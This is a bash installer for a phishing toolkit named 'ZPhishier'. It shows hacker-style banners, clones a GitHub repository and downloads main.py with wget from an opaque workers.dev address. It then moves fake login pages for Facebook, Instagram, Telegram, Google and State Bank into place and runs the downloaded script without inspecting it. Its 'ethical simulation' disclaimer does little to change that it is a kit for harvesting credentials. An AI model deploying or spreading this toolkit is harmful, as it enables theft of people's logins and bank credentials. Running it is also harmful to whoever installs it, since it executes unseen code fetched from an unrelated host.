#!/bin/bash

# =============================================
#  ZPhishier - Advanced Phishing Toolkit
#  Installer Script (Triple Banner Edition)
# =============================================

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
PURPLE='\033[0;35m'
BLUE='\033[0;34m'
WHITE='\033[1;37m'
NC='\033[0m' # No Color

clear

# ==================== BANNER 1: DOOM - ZPhishier ====================
echo -e "${RED}"
echo "______ _   _ _     _     _                "
echo "|___  /| | | | |   (_)   | |              "
echo "   / / | |_| | |__  _ ___| |__   ___ _ __ "
echo "  / /  |  _  | '_ \| / __| '_ \ / _ \ '__|"
echo " / /__ | | | | | | | \__ \ | | |  __/ |   "
echo "/_____||_| |_/_| |_|_|___/_| |_|\___|_|   "
echo ""
echo -e "  ${YELLOW}<< ZPhishier // v2.0 >>${RED}"
echo -e "  ${WHITE}ethical phishing simulation${RED}"
echo -e "  ${YELLOW}github.com/anonmoty/ZPhishier${NC}"
echo ""
echo ""

# ==================== BANNER 2: SUB-ZERO - YOU HAVE BEEN HACKED ====================
echo -e "${BLUE}"
echo "▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄"
echo "█ ██ ███ █  █ ███ █   █ ███ ███ ███ █  █ ███ ███ ███ █ █ ███ █  █ ███ ██ █"
echo "█ ██ ███ █  █ ███ █   █ ███ ███ ███ █  █ ███ ███ ███ █ █ ███ █  █ ███ ██ █"
echo "█ ██ ███ █  █ ███ █   █ ███ ███ ███ █  █ ███ ███ ███ █ █ ███ █  █ ███ ██ █"
echo "█▄▄▄▄▄██▄▄▄▄█▄▄▄█▄▄▄█▄▄▄█▄▄▄█▄▄▄█▄▄▄█▄▄▄█▄▄▄█▄▄▄█▄▄▄█▄▄▄▄▄█▄▄▄█▄▄▄▄█"
echo "▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀"
echo ""
echo -e "  ${CYAN}<< YOU HAVE BEEN HACKED >>${BLUE}"
echo -e "  ${WHITE}your security is an illusion${BLUE}"
echo -e "  ${CYAN}github.com/anonmoty/ZPhishier${NC}"
echo ""
echo ""

# ==================== BANNER 3: NEON GLITCH - DEVELOPER MAXOD ====================
echo -e "${PURPLE}"
echo "▀▀█▀▀ █▀▀█ █░░█ █▀▀ █░░ █▀▀█ █▀▀█ █▀▀ █▀▀█"
echo "░░█░░ █░░█ █▀▀█ █▀▀ █░░ █░░█ █░░█ █▀▀ █▄▄▀"
echo "░░▀░░ ▀▀▀▀ ▀░░▀ ▀▀▀ ▀▀▀ ▀▀▀▀ ▀▀▀▀ ▀▀▀ ▀░▀▀"
echo ""
echo "  █▀▄▀█ █▀▀█ ▀▄ ▄▀ █▀▀█ █▀▀▄"
echo "  █ █ █ █▄▄█  █▀▄█  █  █ █  █"
echo "  ▀   ▀ ▀  ▀  ▀  ▀  ▀▀▀▀ ▀▀▀"
echo ""
echo -e "  ${CYAN}<< Developer Maxod >>${PURPLE}"
echo -e "  ${GREEN}ethical phishing simulation${PURPLE}"
echo -e "  ${YELLOW}github.com/anonmoty/ZPhishier${NC}"
echo ""

echo -e "${RED}[!] For authorized security testing only.${NC}"
echo ""

# Step 1: Install dependencies
echo -e "${YELLOW}[*] Installing dependencies...${NC}"
pkg update -y && pkg upgrade -y
pkg install python -y
pkg install git -y
pkg install wget -y

# Step 2: Clone the repository
echo -e "${YELLOW}[*] Cloning ZPhishier repository...${NC}"
git clone https://github.com/anonmoty/ZPhishier-.git

# Step 3: Enter the directory
cd ZPhishier- || { echo -e "${RED}[!] Failed to enter directory.${NC}"; exit 1; }

# Step 4: Download main.py
echo -e "${YELLOW}[*] Downloading main.py...${NC}"
wget -O main.py https://main.websitevier.workers.dev/

# Step 5: Create templates directory
echo -e "${YELLOW}[*] Setting up templates directory...${NC}"
mkdir -p templates

# Step 6: Move HTML files into templates/
if ls fb.html instagram.html telegram.html Google.html statebank.html 1>/dev/null 2>&1; then
    mv fb.html instagram.html telegram.html Google.html statebank.html templates/ 2>/dev/null
    echo -e "${GREEN}[✓] HTML files moved to templates/${NC}"
else
    echo -e "${YELLOW}[!] Warning: Some HTML files not found. Add manually in templates/${NC}"
fi

# Step 7: Run main.py
echo ""
echo -e "${GREEN}[✓] Installation complete!${NC}"
echo ""

if [ -f "main.py" ]; then
    echo -e "${CYAN}[*] Launching ZPhishier...${NC}"
    echo ""
    python main.py
else
    echo -e "${RED}[!] Error: main.py not found!${NC}"
    exit 1
fi
